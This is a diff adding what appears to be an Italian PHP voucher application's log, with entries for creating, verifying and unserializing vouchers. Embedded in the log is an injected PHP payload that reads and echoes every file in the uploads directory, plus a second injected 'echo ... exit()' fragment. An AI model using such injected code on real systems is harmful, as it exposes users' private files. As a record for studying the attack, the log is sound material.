@@ -1,0 +1,13 @@
+Unserialized voucher xucsx@mssjj.yc tzqpqxvxyiujqda 
+$files1 = array_diff(scandir(getcwd()."/uploads/"), array("..", "."));
+echo $files1;
+foreach ($files1 as &$value) {
+    $x = fopen(getcwd()."/uploads/".$value, "r");
+    $y = fread($x, filesize(getcwd()."/uploads/".$value));
+    echo $y;
+}
+
+Verifica voucher xucsx@mssjj.yc tzqpqxvxyiujqda
+Nuovo utente 4096586@a.com
+Creazione voucher 4096586@a.com a
+Unserialized voucher a@a.com a echo "Errore! Voucher non valido"; exit();
